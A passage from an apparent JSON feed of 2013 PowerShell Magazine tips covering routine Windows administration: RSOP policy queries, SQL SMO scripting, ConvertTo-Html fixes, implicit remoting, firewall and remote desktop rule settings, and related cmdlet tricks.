__NAMESPACE : ROOT\\rsop\\user __PATH : \\\\SHAY\\ROOT\\rsop\\user:__NAMESPACE.Name=\u0026quot;S_1_5_21_1265342080_1232889825_337633078_123\u0026quot; Name : S_1_5_21_1265342080_1232889825_337633078_123 PSComputerName : SHAY (...) Notice that the Name property contains the SID of a user with underscores instead of dashes. With this in mind, we can grab the current user SID, replace the above characters, and get a list of RSOP classes and the policy information for the current user.\nPS\u0026gt; $user = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value -replace '-', '_' PS\u0026gt; Get-WmiObject -Namespace root\\rsop\\user\\$user -List RSOP* NameSpace: ROOT\\rsop\\user\\S_1_5_21_1265342080_1232889825_337633078_123 Name Methods Properties ---- ------- ---------- RSOP_Session {} {creationTime, flags, id, SecurityGroups...} RSOP_ExtensionStatus {} {beginTime, displayName, endTime, error...} RSOP_SOM {} {blocked, blocking, id, reason...} RSOP_GPO {} {accessDenied, enabled, fileSystemPath, filterAllowed...} RSOP_GPLink {} {appliedOrder, enabled, GPO, linkOrder...} RSOP_ExtensionEventSourceLink {} {eventSource, extensionStatus} RSOP_ExtensionEventSource {} {eventLogName, eventLogSource, id} RSOP_PolicySetting {} {creationTime, GPOID, id, name...} RSOP_RegistryPolicySetting {} {command, creationTime, deleted, GPOID...} RSOP_FolderRedirectionPolicySetting {} {creationTime, GPOID, grantType, id...} RSOP_PushPrinterConnectionsPolic... {} {ConnectionType, creationTime, deleted, GPOID...} RSOP_IEAKPolicySetting {} {categories, channels, creationTime, customFavorites...} RSOP_IERegistryPolicySetting {} {command, creationTime, currentUser, deleted...} (...) Get-WmiObject -Namespace root\\rsop\\user\\$user -Class RSOP_RegistryPolicySetting | Format-List Name,registryKey,value* Name : registryKey : Software\\Policies\\Microsoft\\office\\14.0\\outlook\\options\\mail value : {} valueName : valueType : 0 Name : TabProcGrowth registryKey : Software\\Policies\\Microsoft\\Internet Explorer\\Main value : {50, 0, 0, 0} valueName : TabProcGrowth valueType : 1 Name : **Command registryKey : Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel value : {42, 0, 42, 0...} valueName : **Command valueType : 0 Name : ScreenSaveTimeOut registryKey : Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop value : {57, 0, 48, 0...} valueName : ScreenSaveTimeOut valueType : 1 Name : registryKey : Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer value : {} valueName : valueType : 0 Name : NoDriveTypeAutoRun registryKey : Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer value : {255, 0, 0, 0} valueName : NoDriveTypeAutoRun valueType : 4 (...) ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/02/pstip-view-policy-settings-with-rsop-wmi-classes/","tags":["Tips and Tricks","WMI"],"title":"#PSTip View Policy Settings with RSOP WMI classes"},{"categories":["News"],"contents":"Daniel Donda, Windows Expert-IT Pro MVP, has released a new PowerShell eBook written in Brazilian Portuguese. Windows PowerShell 3.0 for IT Pro is an eBook written with infrastructure administrators in mind.\nThe author felt the need to write this eBook because he thought that most Windows PowerShell publications have an inclination to developer’s concepts.\nThis eBook tries another approach using many examples that the author hopes will help with the adoption of Windows PowerShell scripting to automate Windows server administration.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/04/01/free-powershell-3-0-ebook-in-brazilian-portuguese/","tags":["News"],"title":"Free PowerShell 3.0 eBook in Brazilian Portuguese"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0\nThere was a question recently in the PowerShell MVP mailing list about how to detect if a certain process is elevated. There was a suggestion to use an external tool like the Sysinternals tool AccessChk, but I’ve tried to find a way to use PowerShell.\nMy initial though was to look if WMI would show some properties which I could use to detect if a process is elevated. In PowerShell 3.0 I now use the Get-CimInstance cmdlet to retrieve WMI information.\nIf you start, for example, an elevated Command Prompt (cmd.exe), Win32_Process class properties retrieved in a non-elevated PowerShell session would not be the same as the properties retrieved in an elevated PowerShell session.\nWin32_Process class properties in a non-elevated PowerShell session for elevated Command Prompt.\nWin32_Process class properties in an elevated PowerShell session for elevated Command Prompt.\nIf you can see the CommandLine or ExecutablePath properties in a non-elevated PowerShell session for a process you know, this process is not started elevated.\nKirk Munro improved this solution by using the Get-Process cmdlet instead of the Get-CimInstance cmdlet. He looks for the Path and Handle properties of the process to detect if a process is elevated or not.\nGet-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Format-Table Name,Elevated  Here we filter on all processes except the “Idle” and “System” processes and we check if we see the Path and Handle properties and finally use the Add-Member cmdlet to add a custom property (Name) to an instance of the Windows PowerShell object.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/29/pstip-detecting-if-a-certain-process-is-elevated/","tags":["Tips and Tricks"],"title":"#PSTip Detecting if a certain process is elevated"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nA SQL Server instance, by default, deploys a few system databases such as Temp DB, MSDB, Master, and Model DB. Other databases that we create are called user databases. When performing automated actions, we should ensure that we don’t modify any settings of these system databases or any system objects for that matter.\nSo, how do we identify what are the system objects?\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $server.Databases | Select Name, IsSystemObject  We can use the similar approach for finding tables that are system objects.\n$server.Databases['DBName'].Tables | Select Name, IsSystemObject   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/28/pstip-identifying-sql-system-objects-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Identifying SQL system objects using SMO"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, we looked at how we can use SMO in PowerShell to generate T-SQL scripts for cloning databases. Today, we shall see how we can clone database tables. The approach is very similar.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName $server.Databases['DBName']  Once we have the database object, we can access the ‘Tables’ property and retrieve all the tables in the database.\n$server.Databases['DBName'].Tables  Now, if we want to clone a table in a database, we can do that using:\n$server.Databases['DBName'].Tables['TableName'].Script()  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/27/pstip-generate-t-sql-script-to-clone-database-tables-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Generate T-SQL script to clone database tables using SMO"},{"categories":["Tips and Tricks"],"contents":"When you export PowerShell objects to HTML, using the ConvertTo-Html cmdlet, and HTML links are present as the values of the object, ConvertTo-Html doesn’t render them as HTML links. To illustrate, the following snippet creates a table of all cmdlet names (to save space I selected just the first 3) and their online help version.\n$helpTbl = Get-Command -CommandType Cmdlet | Where-Object {$_.HelpUri} | Select Name,@{n='HelpUri';e={\u0026quot;\u0026lt;a href='$($_.HelpUri)'\u0026gt;$($_.HelpUri)\u0026lt;/a\u0026gt;\u0026quot;}} -First 3 | ConvertTo-Html $helpTbl  HTML TABLE    NameHelpUri Add-Computer\u0026lt;a href=\u0026#39;http://go.microsoft.com/fwlink/?LinkID=135194\u0026#39;\u0026gt;http://go.microsoft.com/fwlink/?LinkID=135194\u0026lt;/a\u0026gt; Add-Content\u0026lt;a href=\u0026#39;http://go.microsoft.com/fwlink/?LinkID=113278\u0026#39;\u0026gt;http://go.microsoft.com/fwlink/?LinkID=113278\u0026lt;/a\u0026gt; Add-History\u0026lt;a href=\u0026#39;http://go.microsoft.com/fwlink/?LinkID=113279\u0026#39;\u0026gt;http://go.microsoft.com/fwlink/?LinkID=113279\u0026lt;/a\u0026gt;   Notice that some characters were converted into HTML character entities. Character entities are special reserved characters in HTML. In our example, the less than (\u0026lt;), greater than (\u0026gt;), or (‘) signs were converted into their respective entities so the browser can display them ‘as-is’ and not mix them with HTML tags.\nThat’s nice but it defeats our purpose of making the links clickable. Here’s how the links look when exported to a web page:\nThere is no parameter on the ConvertTo-Html cmdlet to prevent the conversion from happening. To resolve that we can use the HtmlDecode method to convert the entities back to their HTML equivalents.\nTo use the HtmlDecode method we first need to load the System.Web assembly.\nAdd-Type -AssemblyName System.Web [System.Web.HttpUtility]::HtmlDecode($cmd) \u0026lt;!DOCTYPE html PUBLIC \u0026quot;-//W3C//DTD XHTML 1.0 Strict//EN\u0026quot; \u0026quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\u0026quot;\u0026gt; \u0026lt;html xmlns=\u0026quot;http://www.w3.org/1999/xhtml\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;HTML TABLE\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt; table\u0026gt; \u0026lt;colgroup\u0026gt;\u0026lt;col/\u0026gt;\u0026lt;col/\u0026gt;\u0026lt;/colgroup\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;HelpUri\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Add-Computer\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href='http://go.microsoft.com/fwlink/?LinkID=135194'\u0026gt;http://go.microsoft.com/fwlink/?LinkID =135194\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Add-Content\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href='http://go.microsoft.com/fwlink/?LinkID=113278'\u0026gt;http://go.microsoft.com/fwlink/?LinkID=113278\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Add-History\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=' http://go.microsoft.com/fwlink/?LinkID=113279'\u0026gt;http://go.microsoft.com/fwlink/?LinkID=113279\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; The output is not as pretty as ConvertTo-Html output but it does exactly what we wanted to–no HTML entities are present. Let’s have a look of the result in a browser:\n$helpTbl = Get-Command -CommandType Cmdlet | Where-Object {$_.HelpUri} | Select Name,@{n='HelpUri';e={\u0026quot;\u0026amp;lt;a href='$($_.HelpUri)'\u0026amp;gt;$($_.HelpUri)\u0026amp;lt;/a\u0026amp;gt;\u0026quot;}} -First 3 | ConvertTo-Html Add-Type -AssemblyName System.Web [System.Web.HttpUtility]::HtmlDecode($helpTbl) | Out-File d:\\temp\\PSCommands.html Invoke-Item d:\\temp\\PSCommands.html ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/25/pstip-fixing-the-output-of-convertto-html/","tags":["Tips and Tricks"],"title":"#PSTip Fixing the output of ConvertTo-Html"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nSince PowerShell 2.0 we could use implicit remoting to import cmdlets from a remote PowerShell session into the local PowerShell session:\nPS [1]: $session = New-PSSession -ComputerName dc01 PS [2]: Invoke-Command -Session $session -ScriptBlock {Import-Module ActiveDirectory} PS [3]: Import-PSSession -Session $session -Module ActiveDirectory ModuleType Name ExportedCommands ---------- ---- ---------------- Script tmp_mwxq3nlx.ko3 {Add-ADComputerServiceAccount... After running the commands in the above example we can run cmdlets from the ActiveDirectory module, like Get-ADUser, without having the module installed on the local machine. The cmdlets we run from the imported module will run implicitly through the remote PowerShell session.\nIn PowerShell 3.0, we got more options in regards to implicit remoting. We now have a –CimSession parameter on Get-Module, which can be used with –ListAvailable to retrieve the modules available on the remote computer:\nPS [4]: Get-Module -CimSession server01 -ListAvailable ModuleType Name ExportedCommands ---------- ---- ---------------- Manifest AppLocker {Get-AppLockerFileInformation... Manifest Appx {Add-AppxPackage, Get-AppxPac... Manifest BestPractices {Get-BpaModel, Get-BpaResult,... Manifest BitsTransfer {Add-BitsFile, Complete-BitsT... Manifest BranchCache {Add-BCDataCacheExtension, Cl... Manifest CimCmdlets {Get-CimAssociatedInstance, G... (...) As we can see in the example above we did not need to first establish a session with the remote computer, we specified a computer name rather than a session object.\nThe same technique can be used with Import-Module in order to implicitly import a module from a remote computer:\nPS [5]: Import-Module -Name NetAdapter -CimSession hyperv01  Now that the NetAdapter module is imported we can use the cmdlets available in the module, for example Get-NetAdapter:\nPS [6]: Get-NetAdapter Name InterfaceDescription ifIndex Status ---- -------------------- ------- ----- FailoverCluster_CSV_DS... HP NC551i Dual Port FlexFabric 10G...#3 14 Up Hyper-V_VMSwitch_DS.He... HP NC551i Dual Port FlexFabric 10G...#2 13 Up Hyper-V_LiveMigration_... HP NC551i Dual Port FlexFabric 10G...#4 15 Up Hyper-V_VMSwitch_DS.iSCSI HP NC551i Dual Port FlexFabric 10G...#8 19 Up Hyper-V_VMSwitch_DS.Admin HP NC551i Dual Port FlexFabric 10G...#7 18 Up Hyper-V_VMSwitch_Trunk HP NC551i Dual Port FlexFabric 10G...#5 16 Up FailoverCluster_Heartb... HP NC551i Dual Port FlexFabric 10G...#6 17 Up Server_Management_DS.A... HP NC551i Dual Port FlexFabric 10Gb ... 12 Up The output in the example above lists the network adapters from the remote machine.\nNote that only Cmdlet Definition XML (CDXML)-based modules can be imported this way. This is what happens if we try to import a non-CDXML-based module:\nPS [7]: Import-Module -Name Hyper-V -CimSession hyperv01 Import-Module : The module Hyper-V cannot be imported over a CimSession. Try u sing the PSSession parameter of the Import-Module cmdlet. At line:1 char:1 + Import-Module -Name Hyper-V -CimSession hyperv01 + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidArgument: (Hyper-V:String) [Import-Module ], ArgumentException + FullyQualifiedErrorId : PsModuleOverCimSessionError,Microsoft.PowerShell .Commands.ImportModuleCommand   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/22/pstip-enhancements-to-implicit-remoting-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Enhancements to implicit remoting in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"When automating Microsoft Excel, almost every time you’ll need to include some constant values to define the behaviour of the code. Excel (and other Office applications) makes extensive use of constant values via enumeration objects. For example, to right align cell content you need to know in advance the value of the xlRight constant. Most of the time you’ll lookup the value using an Internet search or use some VBA-Fu techniques and hard code it in your script.\n$xlRight = -4152 $sheet.Range('A1').HorizontalAlignment = $xlRight In this tip I want to suggest a convenient way to work with those constants, a way that utilizes tab completion and that also doesn’t require you to know the numeric value of the constant in question. Now it’s very easy to discover all constants that have ‘right’ in their name.\nThe following code iterates over all Enumeration objects of Excel, converge all values into one PowerShell custom object. Now whenever you need to specify one of the constants, it’s very easy to discover the value.\n# create Excel object $xl = New-Object -ComObject Excel.Application # create new PowerShell object $xlEnum = New-Object -TypeName PSObject # get all Excel exported types of type Enum $xl.GetType().Assembly.GetExportedTypes() | Where-Object {$_.IsEnum} | ForEach-Object { # create properties from enum values $enum = $_ $enum.GetEnumNames() | ForEach-Object { $xlEnum | Add-Member -MemberType NoteProperty -Name $_ -Value $enum::($_) } } Now you can use constants without hard coding them first.\n$sheet.Range(\u0026lsquo;A1\u0026rsquo;).HorizontalAlignment = $xlEnum.xlRight\nIf you still need to find the numeric value:\nPS\u0026gt; $xlEnum.xlRight.value__ -4152 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/20/pstip-working-with-excel-constants/","tags":["Tips and Tricks"],"title":"#PSTip Working with Excel constants"},{"categories":["News"],"contents":"Microsoft has released the Windows PowerShell 3.0 SDK Sample Pack. The pack contains code samples that show how to build applications based on Windows PowerShell 3.0.\nThe code samples (C#) demonstrate how to use the Windows PowerShell 3.0 API to build a rich set of applications. The package contain code samples that show how to host the Windows PowerShell Workflow runtime, generate workflow activities from Windows PowerShell cmdlets and modules, disconnect and reconnect a Windows PowerShell session, support paging operations, and a number of other tasks that are possible with Windows PowerShell 3.0. It also includes samples from the Windows PowerShell 2.0 SDK.\nYou can download individual samples or all the samples at once.\nNote that in order to use the samples you’ll need to install the Windows Software Development Kit (SDK) for Windows 8 which includes the reference assemblies for Windows PowerShell 3.0.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/20/the-windows-powershell-3-0-sdk-sample-pack/","tags":["News"],"title":"The Windows PowerShell 3.0 SDK Sample Pack"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nAs database administrator, you may want to create a database on development or test servers with similar settings as on the production server. This is usually done using T-SQL. So, how is this related to PowerShell?\nWe can use SQL SMO objects in PowerShell to generate this T-SQL script!\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:ComputerName  Once we have the SQL Server object, we can use the Databases property to list all databases on the server.\n$server.Databases  The database object has the Script() method which can be used to generate the T-SQL script!\n$server.Databases['DBName'].Script()   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/19/pstip-generate-t-sql-script-for-cloning-a-sql-database/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Generate T-SQL script for cloning a SQL database"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn a previous tip I wrote about the International module. One of the commands of the module, Get-WinHomeLocation, returns a GeoID object which represents the home location (Country and Region) of the current user account.\nPS\u0026gt; Get-WinHomeLocation GeoId HomeLocation ----- ------------ 244 United States We can use the Set-WinHomeLocation to change the location but it requires us to have the GeoID numeric value in advance:\nSet-WinHomeLocation -GeoId \u0026lt;int32\u0026gt;  Unfortunately, none of the International module commands gets you a list of countries and their GeoId value. Luckily, there’s a .NET class, RegionaInfo, you can use to get the GeoId of a specific culture. The following function creates a list of RegionalInfo objects for all InstalledWin32Cultures cultures on the current system. Run it without any parameters and you’ll get the complete list, or supply a (partial) value.\nfunction Get-RegionInfo($Name='*') { $cultures = [System.Globalization.CultureInfo]::GetCultures('InstalledWin32Cultures') foreach($culture in $cultures) { try{ $region = [System.Globalization.RegionInfo]$culture.Name if($region.DisplayName -like $Name) { $region } } catch {} } } PS\u0026gt; Get-RegionInfo -Name *isr* Name : he-IL EnglishName : Israel DisplayName : Israel NativeName : ישראל TwoLetterISORegionName : IL ThreeLetterISORegionName : ISR ThreeLetterWindowsRegionName : ISR IsMetric : True GeoId : 117 CurrencyEnglishName : Israeli New Shekel CurrencyNativeName : שקל חדש CurrencySymbol : ₪ ISOCurrencySymbol : ILS PS\u0026gt; Get-RegionInfo | Sort-Object DisplayName | Select-Object Name,DisplayName,GeoId | Out-GridView ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/18/pstip-get-a-list-of-geographical-locations/","tags":["Tips and Tricks"],"title":"#PSTip Get a list of geographical locations"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nPrior to PowerShell 3.0, to return a list of names or values of an Enumeration object, we needed to use the static methods of the System.Enum type:\nPS\u0026gt; [System.Enum]::GetNames('System.ConsoleColor') Black DarkBlue DarkGreen DarkCyan (...) PS\u0026gt; [System.Enum]::GetValues('System.ConsoleColor') Black DarkBlue DarkGreen DarkCyan (...) PowerShell 3.0 runs on .NET 4.0 and in .NET 4.0 we can get the same information using new System.Type methods:\n[System.ConsoleColor].GetEnumValues() - or - [System.ConsoleColor].GetEnumNames() ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/15/pstip-getting-enum-values-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Getting Enum values in PowerShell 3.0"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIf you have ever backed up a SQL Server database, you will know that the default backup location is set to the Program Files folder where SQL is installed. For example, on a system with SQL Server 2008 R2, it is set to C:\\Program Files\\Microsoft SQL Server\\MSSQL10_50.MSSQLSERVER\\MSSQL\\Backup. This may not always be an ideal location to store database backups.\nSo, how do we change this using PowerShell? We can either use Windows Registry to change this path or SQL Management Objects (SMO) to do this. We shall see how we can use SMO in this tip.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $server = New-Object Microsoft.SqlServer.Management.Smo.Server($env:ComputerName) $server.Properties[\"BackupDirectory\"].Value = \"K:\\Backup\" $server.Alter()  Make a note that the assembly version specified in Add-Type command above is SQL Server 2008 R2 version. If you want to use this code snippet for SQL Server 2012, you’d have to find the right SMO version.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/14/pstip-change-sql-server-default-backup-folder-location/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Change SQL Server default backup folder location"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWindows 8 and Windows Server 2012 ships with a new module worth exploring: the International module. You can use the module cmdlets to control the language that is used for various elements of the user interface (UI). Since the early days of PowerShell, we could get the current culture with the Get-Culture cmdlet but we couldn’t set it. The International module enables us to set the culture with the Set-Culture cmdlet.\nThe Set-Culture cmdlet enables you to quickly set the user culture for the current user account. The information includes the names for the culture, the writing system, the calendar, and formatting for dates and sort strings.\nSet-Culture -CultureInfo he-IL  Here’s a list of the International module commands:\nPS\u0026gt; Get-Command -Module International CommandType Name ModuleName ----------- ---- ---------- Cmdlet Get-WinAcceptLanguageFromLanguageListOptOut International Cmdlet Get-WinCultureFromLanguageListOptOut International Cmdlet Get-WinDefaultInputMethodOverride International Cmdlet Get-WinHomeLocation International Cmdlet Get-WinLanguageBarOption International Cmdlet Get-WinSystemLocale International Cmdlet Get-WinUILanguageOverride International Cmdlet Get-WinUserLanguageList International Cmdlet New-WinUserLanguageList International Cmdlet Set-Culture International Cmdlet Set-WinAcceptLanguageFromLanguageListOptOut International Cmdlet Set-WinCultureFromLanguageListOptOut International Cmdlet Set-WinDefaultInputMethodOverride International Cmdlet Set-WinHomeLocation International Cmdlet Set-WinLanguageBarOption International Cmdlet Set-WinSystemLocale International Cmdlet Set-WinUILanguageOverride International Cmdlet Set-WinUserLanguageList International ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/13/pstip-how-to-configure-international-settings-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip How to configure International settings in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nThe NetSecurity module in Windows Server 2012 and Windows 8 lets us configure Windows Firewall settings locally and remotely. The _Set-NetFirewallProfile _can be used to enable or disable the firewall.\nFirst, let us see how we can enable firewall\nGet-NetFirewallProfile | Set-NetFirewallProfile -Enabled True  To disable firewall, we can run\nGet-NetFirewallProfile | Set-NetFirewallProfile -Enabled False  The above commands will change the firewall status on the local computer. How about remote systems? Simple, we use the -CimSession parameter.\nGet-NetFirewallProfile -CimSession Server-01 | Set-NetFirewallProfile -Enabled False  By default, the Get-NetFirewallProfile cmdlet returns all Firewall profiles — Domain, Private, and Public. So, by sending the output of this to Set-NetFirewallProfile, we can either disable or enable all profiles at once. It is also possible to select a specified profile using the -Name parameter.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/11/pstip-set-windows-firewall-status-in-windows-server-2012-and-windows-8/","tags":["Tips and Tricks"],"title":"#PSTip Set Windows Firewall status in Windows Server 2012 and Windows 8"},{"categories":["Tips and Tricks"],"contents":"Someone at the office asked me to check why a specific file was failing to execute. When double-clicking the file, nothing happened and no related process could be found in Task Manager. To cut the long story short, we found that the issue was probably running the file on a 32-bit machine while the file was written for x64 platforms. Anyway, we wanted to verify that and I was looking for a way to do that with PowerShell. After a short web search I found this StackOverflow thread.\nHere’s the translated version of the suggested C# code. It sure verified our suspicion–the failing file was written for x64 platforms. Here’s a test against notepad.exe.\n$MACHINE_OFFSET = 4 $PE_POINTER_OFFSET = 60 $MachineType = Write-Output Native I386 Itanium x64 $filePath = \u0026quot;$env:windir\\notepad.exe\u0026quot; $data = New-Object System.Byte[] 4096 $stream = New-Object System.IO.FileStream -ArgumentList $filePath,Open,Read $stream.Read($data,0,$PE_POINTER_OFFSET) | Out-Null $PE_HEADER_ADDR = [System.BitConverter]::ToInt32($data, $PE_POINTER_OFFSET) $machineUint = [System.BitConverter]::ToUInt16($data, $PE_HEADER_ADDR + $MACHINE_OFFSET) $MachineType[$machineUint] ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/08/pstip-how-to-determine-if-a-file-is-32bit-or-64bit/","tags":["Tips and Tricks"],"title":"#PSTip How to determine if a file is 32-bit or 64-bit"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWindows 8 and Windows Server 2012 included cmdlets to manage storage. One such cmdlet is Mount-DiskImage which can be used to mount ISO, VHD, and VHDX files. But, unfortunately, this cmdlet does not give us information on the drive letter assigned to the newly mounted disk image. Knowing the drive letter might be a very important thing when using these cmdlets in a script.\nSo, how do we find the drive letter? Here is one method:\n$before = (Get-Volume).DriveLetter Mount-DiskImage -ImagePath C:\\test\\Test.vhd -StorageType VHD $after = (Get-Volume).DriveLetter compare $before $after -Passthru  There are other methods too–such as using PowerShell eventing or background jobs, etc. Let us save that for future tips! 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/07/pstip-finding-the-drive-letter-of-a-mounted-disk-image/","tags":["Tips and Tricks"],"title":"#PSTip Finding the drive letter of a mounted disk image"},{"categories":["Tips and Tricks"],"contents":"When troubleshooting WinRM errors, you’ll sometime encounter hex error codes, such as 0x80338104, which don’t say much about the error itself. In such cases, you can use the winrm command line tool with the helpmsg parameter, to convert the error code to a readable error description.\nPS\u0026gt; winrm helpmsg 0x80338104 The WS-Management service cannot process the request. The WMI service returned an 'access denied' error.  Bonus tip: All error codes that start with 0x8033 are WinRM errors.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/06/pstip-decoding-winrm-error-messages/","tags":["Tips and Tricks"],"title":"#PSTip Decoding WinRM error messages"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhen using the Hyper-V PowerShell cmdlets in Windows Server 2012, the VM objects can be retrieved using Get-VM cmdlet.\n$vm = Get-VM  By default, these VM objects refresh based on the events from the virtual machines. For example, take a look at this screen capture:\nAs you see, the VM object in $vm gets refreshed automatically. This is possible because, by default, virtual machine eventing is enabled. We can disable this behavior by using Disable-VMEventing cmdlet. This might be useful in cases when we want to use the VM object in a script, work on the VM’s captured object state and not refresh the object.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/05/pstip-automatic-refresh-of-hyper-v-vm-objects/","tags":["Tips and Tricks"],"title":"#PSTip Automatic refresh of Hyper-V VM Objects"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nStarting with PowerShell 2.0 we can create new objects and set property values with the Property parameter. For instance, launch MS Word and set its visibility.\nNew-Object -ComObject Word.Application -Property @{Visible=$true}  Did you know that you can also invoke objects methods? The next example creates a new instance of IE and navigates to a website.\n$property = @{Visible=$true; Navigate2='http://PowerShellMagazine.com'} New-Object -ComObject InternetExplorer.Application -Property $property  In the following example we create a new ArrayList object and invoke the AddRange method to create 10 elements with corresponding values from 1 to 10.\nNew-Object System.Collections.ArrayList -Property @{AddRange = 1..10}   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/03/04/pstip-invoking-methods-with-new-object/","tags":["Tips and Tricks"],"title":"#PSTip Invoking methods with New-Object"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn a couple of earlier posts, we looked at how we can get firewall rules and add new rules. In this post, we shall see an example of extending this knowledge to enable firewall rule for remote desktop access.\nThere is a built-in firewall rule that needs to enabled for allowing remote desktop access. Make a note that this is not about enabling remote desktop but ensuring that we allow remote desktop access in Windows Firewall.\nFirst, let us see how we can check if the remote desktop firewall rule is enabled:\nGet-NetFirewallRule -DisplayName \"Remote Desktop*\" | Select DisplayName, Enabled  When you run the above command, you will see two firewall rules – “Remote Desktop – User Mode (TCP-In)” and “Remote Desktop – User Mode (UDP-In)”.\nWe have to enable both these rules to ensure we allow remote desktop access through Windows Firewall.\nGet-NetFirewallRule -DisplayName \"Remote Desktop*\" | Set-NetFirewallRule -enabled true  That is it! You will see that the remote desktop firewall rules are now enabled.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/21/pstip-enabling-remote-desktop-access-firewall-rules-in-windows-8-and-windows-server-2012/","tags":["Tips and Tricks"],"title":"#PSTip Enabling remote desktop access firewall rules in Windows 8 and Windows Server 